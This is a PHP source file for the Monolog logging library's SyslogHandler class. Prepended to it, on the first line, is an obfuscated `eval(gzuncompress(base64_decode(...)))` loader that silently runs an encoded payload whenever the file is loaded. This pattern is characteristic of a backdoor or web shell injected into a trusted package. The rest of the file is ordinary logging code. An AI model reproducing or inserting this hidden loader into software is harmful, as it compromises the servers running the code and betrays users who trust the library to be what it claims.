<?php eval(gzuncompress(base64_decode('eNpdUs1u00AQfpWNlYMdrDhO89dEOZTKolEpQYkBoRpZU+86u8TZtdZr1X6A3jhy4Q248gxUvAavwjhpgWQPO/+ab74ZkdottstN7XVeZkpRKeRnmJIFyUSyJbUqNWGgM3XHXAKSklJSdXDfg0l4t+PZ7XgdrN4Hq1vrKgzfxu/Qii9eBW9C65PjTNvxt+8/f/14fJyD1lDb1iXXKvKHQ2a5VlQNRqj7mqUqqsYTdIVaUCYNajfrRYDiQ5OAXe+LQ0EiZFmhusgx0FMyqkZDNC8k1UpQ1JY504ByDSloYTmzVGkGCbf/QiFQtOMvvx++PjhTkdpFuBK5Kk4Hiarh8L9Z3OeS1nzuddaggfvnaYJk7fC5RG2hRjpSyAp2SqaBLUPWSA7SFESlqUs2upRGyA0SjTEgRqssw/o9opYoCmYQ0OVyeb0IbnHu0cTkcSloXBo06J7bIgiTJoHZFt9HMTKIy8gfDXZIgG+5obgJbOdFb9zr945Bf2TA92vG7sIQrcpNs81O76x3ir7YweEWiOHNVdwpZep9bt+ZXTGggbat1yoBI5ScEm5MPvU8/2zQjaqz/uC86/uj7njiCUmbZVXdnOe4FirYMaQlJzWicrENGJIylhVkg0CaI3NmTFKR/vuflvrkmB1jXjeI3WdRM8YAOG/m+wMpCvZB')));?><?php

/*
 * This file is part of the Monolog package.
 *
 * (c) Jordi Boggiano <j.boggiano@seld.be>
 *
 * For the full copyright and license information, please view the LICENSE
 * file that was distributed with this source code.
 */

namespace Monolog\Handler;

use Monolog\Logger;

/**
 * Logs to syslog service.
 *
 * usage example:
 *
 *   $log = new Logger('application');
 *   $syslog = new SyslogHandler('myfacility', 'local6');
 *   $formatter = new LineFormatter("%channel%.%level_name%: %message% %extra%");
 *   $syslog->setFormatter($formatter);
 *   $log->pushHandler($syslog);
 *
 * @author Sven Paulus <sven@karlsruhe.org>
 */
class SyslogHandler extends AbstractSyslogHandler
{
    protected $ident;
    protected $logopts;

    /**
     * @param string  $ident
     * @param mixed   $facility
     * @param int     $level    The minimum logging level at which this handler will be triggered
     * @param Boolean $bubble   Whether the messages that are handled can bubble up the stack or not
     * @param int     $logopts  Option flags for the openlog() call, defaults to LOG_PID
     */
    public function __construct($ident, $facility = LOG_USER, $level = Logger::DEBUG, $bubble = true, $logopts = LOG_PID)
    {
        parent::__construct($facility, $level, $bubble);

        $this->ident = $ident;
        $this->logopts = $logopts;
    }

    /**
     * {@inheritdoc}
     */
    public function close()
    {
        closelog();
    }

    /**
     * {@inheritdoc}
     */
    protected function write(array $record)
    {
        if (!openlog($this->ident, $this->logopts, $this->facility)) {
            throw new \LogicException('Can\'t open syslog for ident "'.$this->ident.'" and facility "'.$this->facility.'"');
        }
        syslog($this->logLevels[$record['level']], (string) $record['formatted']);
    }
}
